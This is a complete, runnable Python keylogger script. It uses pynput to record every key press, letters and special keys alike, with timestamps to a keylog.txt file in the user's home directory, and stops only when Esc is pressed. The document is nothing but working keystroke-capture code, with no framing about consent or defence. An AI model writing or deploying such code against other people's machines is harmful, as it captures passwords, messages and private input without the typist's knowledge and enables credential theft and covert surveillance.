from pynput.keyboard import Listener, Key
import logging
import os

log_dir = os.path.expanduser('~')  # Save in the user's home directory
log_file = os.path.join(log_dir, 'keylog.txt')

logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    try:
        logging.info(f"Key {key.char} pressed")
    except AttributeError:
      
        logging.info(f"Special key {key} pressed")
def on_release(key):
    if key == Key.esc:
        # Stop listener when 'Esc' is pressed
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
